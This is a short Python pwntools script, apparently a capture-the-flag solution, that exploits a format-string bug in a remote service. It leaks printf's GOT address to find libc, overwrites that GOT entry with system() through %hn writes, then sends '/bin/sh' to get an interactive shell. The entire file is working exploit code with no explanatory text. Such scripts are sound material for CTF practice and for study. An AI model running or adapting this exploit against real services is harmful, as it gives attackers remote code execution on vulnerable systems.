#coding=utf-8
__author__="rocky"
payload="%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|"
from pwn import *
p=remote('218.2.197.235',23745)
libc=ELF('./libc.so.2-13')
p.recvuntil('\n')

printf_got=0x8049974
payload='A'*20+p32(printf_got)+'|%12$s|'
p.sendline(payload)
data=p.recvuntil('\n')
print data
printf_addr=u32(data[25:29])
print "printf_addr",": ",hex(printf_addr)

libc.address=printf_addr-libc.symbols['printf']
print "libc.address",": ",hex((libc.address))
system_addr=libc.symbols['system']
print "system_addr",": ",hex((system_addr))

system_l=system_addr&0xffff
system_h=system_addr>>16
print hex(system_h),hex(system_l)

payload='%'+str(system_l)+'c%14$hn'+'%'+str(system_h-system_l)+'c%15$hn'
print len(payload)
payload=payload.ljust(28,'A')
payload+=p32(printf_got)+p32(printf_got+0x2)
print payload
p.sendline(payload)

p.sendline('/bin/sh')
p.interactive()
